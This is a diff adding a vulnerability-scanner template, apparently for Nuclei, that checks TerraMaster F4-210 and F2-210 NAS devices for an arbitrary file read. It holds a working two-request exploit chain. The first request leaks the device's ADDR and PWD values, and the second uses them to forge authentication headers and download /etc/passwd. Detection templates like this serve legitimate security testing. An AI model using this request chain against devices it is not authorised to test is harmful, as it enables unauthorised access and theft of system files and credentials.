@@ -1,0 +1,67 @@
+id: terramaster-f4-210-file-read
+info:
+  name: TerraMaster F4-210 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    TerraMaster F4-210 and F2-210 devices have an arbitrary file read vulnerability that allows attackers to read sensitive information.
+  reference:
+    - https://www.terra-master.com/cn/
+    - https://packetstormsecurity.com/files/165399/terramaster-exec.py.txt
+  tags: file-read
+
+variables:
+  timestamp: '{{unix_time()}}'
+
+http:
+  - raw:
+      - |
+        POST /module/api.php?mobile/wapNasIPS HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: TNAS
+        User-Device: TNAS
+        Content-Type: application/x-www-form-urlencoded
+
+    extractors:
+      - type: regex
+        name: addr_key
+        internal: true
+        regex:
+          - '"ADDR":"(.*?)"'
+        group: 1
+      - type: regex
+        name: pwd_key
+        internal: true
+        regex:
+          - '"PWD":"(.*?)"'
+        group: 1
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "PWD"
+          - "ADDR"
+        condition: and
+
+  - raw:
+      - |
+        POST /module/api.php?mobile/fileDownload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: TNAS
+        User-Device: TNAS
+        Signature: {{md5(concat(addr_key, timestamp))}}
+        Timestamp: {{timestamp}}
+        Authorization: {{pwd_key}}
+        Cookie: kod_name=guest; kod_token={{md5(addr_key)}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=%2Fetc%2Fpasswd
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+    matchers-condition: and
